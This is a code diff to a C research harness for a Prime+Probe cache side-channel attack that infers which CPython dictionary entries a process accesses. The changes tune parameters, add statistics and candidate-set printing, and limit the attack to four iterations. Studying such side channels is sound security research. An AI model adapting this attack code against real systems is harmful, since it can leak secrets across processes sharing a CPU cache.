@@ -6,6 +6,7 @@
 #include "prime_probe.h"
 #include "Python.h"
 #include "shared_memory.h"
+#include <stdio.h>
 
 static const char* dump_dir = "cpython_dict_profiling";
 static const int max_exec_cycles = (int)1e6;
@@ -14,16 +15,18 @@ static uint64_t probe_time_arr[cache_line_count][profile_samples];
 static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
 static uint64_t* sample_tsc[cache_line_count];
 static uint64_t* probe_time[cache_line_count];
-static const int dict_entries = 1 << 16;
+static const int dict_entries = 1 << 10;
 static const int target_entries = 4;
-static const int dict_iterations = 32;
-static const int factor = 2;
+static const int dict_iterations = 10000;
+static const int factor = 4;
 static const int threshold = 8;
+
+static const int attack_iterations = 4;
 
 u32* profiles = NULL;
 
 static bool check(u32 ctr) {
-    return ctr >= dict_iterations / factor && ctr <= factor * dict_iterations;
+    return (ctr >= dict_iterations / factor) && (ctr <= factor * dict_iterations);
 }
 
 static u32 cpython_PS_profile_once(EVSet* evset,
@@ -46,8 +49,6 @@ static u32 cpython_PS_profile_once(EVSet* evset,
         tsc1 = rdtscp();
 
         scope_lat = _time_maccess_aux(scope, end, aux);
-        int scope_evict = scope_lat > threshold &&
-                          scope_lat < detected_cache_lats.interrupt_thresh;
         if (scope_lat > threshold) {
             if (scope_lat < detected_cache_lats.interrupt_thresh) {
                 probe_time[0][index] = scope_lat;
@@ -92,8 +93,8 @@ static void profile(int i, int j) {
 
             profiles[j * cfg->l3.sets + l3_set] = res;
 
-            dump_profiling_trace(dump_dir, j * cfg->l3.sets + l3_set, sample_tsc, probe_time,
-                                 cache_line_count, profile_samples);
+            //dump_profiling_trace(dump_dir, j * cfg->l3.sets + l3_set, sample_tsc, probe_time,
+            //                     cache_line_count, profile_samples);
         } else {
             log_error("Cannot get evset for set %d", l3_set);
         }
@@ -104,7 +105,15 @@ static int infer(int j) {
     config_t *cfg = get_config();
 
     u32 unique[target_entries];
+    u32 full_sums[target_entries];
+    u32 c_sums[target_entries];
+    u32 t_sums[target_entries];
+    u32 u_sums[target_entries];
     memset(unique, 0, target_entries * sizeof(u32));
+    memset(full_sums, 0, target_entries * sizeof(u32));
+    memset(c_sums, 0, target_entries * sizeof(u32));
+    memset(t_sums, 0, target_entries * sizeof(u32));
+    memset(u_sums, 0, target_entries * sizeof(u32));
 
     for (int l3 = 0; l3 < cfg->l3.sets; ++l3) {
         u32 ctr = profiles[j * cfg->l3.sets + l3];
@@ -117,6 +126,12 @@ static int infer(int j) {
             if (c != t) {
                 unique[i]++;
             }
+
+            u32 tmp = (tctr - ctr) * (tctr - ctr);
+            full_sums[i] += tmp;
+            if (c && !t) c_sums[i] += tmp;
+            if (t && !c) t_sums[i] += tmp;
+            if (c && t) u_sums[i] += tmp;
         }
     }
 
@@ -124,6 +139,10 @@ static int infer(int j) {
 
     for (int i = 0; i < target_entries; ++i) {
         log_info("%d: unique[%d] = %u", j, i, unique[i]);
+        log_info("%d: full_sums[%d] = %u", j, i, full_sums[i]);
+        log_info("%d: c_sums[%d] = %u", j, i, c_sums[i]);
+        log_info("%d: t_sums[%d] = %u", j, i, t_sums[i]);
+        log_info("%d: u_sums[%d] = %u", j, i, u_sums[i]);
         if (unique[i] <= threshold) {
             if (index != -1) {
                 if (unique[i] < unique[index]) {
@@ -139,7 +158,6 @@ static int infer(int j) {
 }
 
 int main(int argc, char* argv[]) {
-    //iso_cpu();
     config_t* cfg = get_config();
 
     if (cache_env_init(1)) {
@@ -151,9 +169,7 @@ int main(int argc, char* argv[]) {
     u32 profile_size = l3_sets * (target_entries + 2);
     profiles = malloc(profile_size * sizeof(u32));
     memset(profiles, 0, profile_size * sizeof(u32));
-    int skip = 0;
 
-    EVSet* evset;
     helper_thread_ctrl hctrl;
 
     if (LLCF_multi_evset(0, &hctrl)) {
@@ -201,13 +217,24 @@ int main(int argc, char* argv[]) {
         profile(targets[i], i);
     }
 
+    for (int i = 0; i < target_entries; ++i) {
+        printf("%d: [", i);
+        for(int j = 0; j < cfg->l3.sets; ++j) {
+            u32 ctr = profiles[i * cfg->l3.sets + j];
+            if (check(ctr)) {
+                printf(", %5d", j);
+            }
+        }
+        printf("]\n");
+    }
+
     srand(time(NULL));
 
     int target_success = 0;
     int target_access = 0;
     int access_success = 0;
 
-    for (int i = 0; i < 100; ++i) {
+    for (int i = 0; i < attack_iterations; ++i) {
     	log_info("iteration: %d", i);
     	// Hit
     	int h = rand() % target_entries;
@@ -251,9 +278,9 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    log_info("Target success rate: %d", target_success);
-    log_info("Target access success rate: %d", target_access);
-    log_info("Access success rate: %d", access_success);
+    log_info("Target success rate: %d", target_success / attack_iterations);
+    log_info("Target access success rate: %d", target_access / attack_iterations);
+    log_info("Access success rate: %d", access_success / attack_iterations);
 
     sync_ctx_set_action(SYNC_CTX_EXIT);
     pthread_barrier_wait(sync_ctx.barrier);
